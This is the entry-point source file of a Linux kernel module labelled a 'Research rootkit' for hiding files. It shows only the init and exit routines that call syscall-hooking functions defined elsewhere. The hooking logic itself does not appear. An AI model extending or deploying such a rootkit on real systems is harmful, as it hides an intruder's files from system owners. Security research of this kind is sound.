#include <linux/module.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/miscdevice.h>

#include "syscall_hooks.h"
#include "mem_protection.h"

MODULE_AUTHOR("Erez");
MODULE_DESCRIPTION("Research rootkit");
MODULE_LICENSE("GPL");

static int __init hidefiles_init()
{
	error_code_e ret_code = SYSCALL_HOOKS_init();

	printk(KERN_INFO "%s: Successfuly loaded hidefiles\n", __func__);
	return (int)ret_code;
}

static void __exit hidefiles_exit()
{
	SYSCALL_HOOKS_exit();
	printk(KERN_INFO "%s: Successfuly unloaded hidefiles\n", __func__);
}

module_init(hidefiles_init);
module_exit(hidefiles_exit);
